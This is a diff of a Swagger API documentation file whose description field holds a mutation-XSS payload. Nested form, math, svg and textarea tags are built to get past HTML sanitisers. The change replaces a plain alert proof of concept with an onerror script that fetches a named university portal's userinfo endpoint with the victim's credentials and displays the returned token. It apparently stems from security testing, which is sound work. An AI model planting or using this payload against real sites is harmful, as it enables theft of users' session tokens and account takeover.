@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('1') src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror="fetch('https://myportaltest.calpoly.edu/api/v5-1/userinfo',{credentials:'include'}).then(r=>r.ok?r.text():Promise.reject(r.status)).then(jwt=>alert(jwt)).catch(err=>console.error(err));" src=1>></form>
 
   version: production
 basePath: /JSSResource/
